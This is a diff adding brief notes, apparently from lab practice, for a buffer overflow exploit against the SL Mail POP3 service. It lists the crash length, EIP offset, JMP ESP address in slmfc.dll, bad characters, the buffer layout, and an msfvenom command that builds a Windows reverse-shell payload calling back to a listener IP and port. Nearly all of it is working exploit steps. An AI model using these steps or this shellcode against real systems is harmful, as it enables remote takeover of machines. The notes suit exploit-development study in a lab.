@@ -1,0 +1,26 @@
+Application: SL Mail
+
+IP 192.168.0.13
+Port 110
+________________________________________________
+
+1. crash buffer and server crash at 3000
+
+2. Send pattern and find EIP => 39694438
+
+3. Find Offset 2606
+
+4. EIP control 
+buffer="A"*2606+"BBBB" +"DDDD"
+
+5. Find JMP ESP => !mona modules (no bad char to ensure) 
+  !mona find -s "\xff\xe4" -m slmfc.dll
+  5F4A358F
+
+6. FInd Bad Char "\x00\x0a\x0d"
+
+JMP ESP 5F4A358F
+
+7. FInal Shell code msfvenom -p windows/shell_reverse_tcp LHOS=192.168.0.135 LPORT=1234 EXITFUNC=thread -f c  -b "\x00\x0a\x0d"
+
+
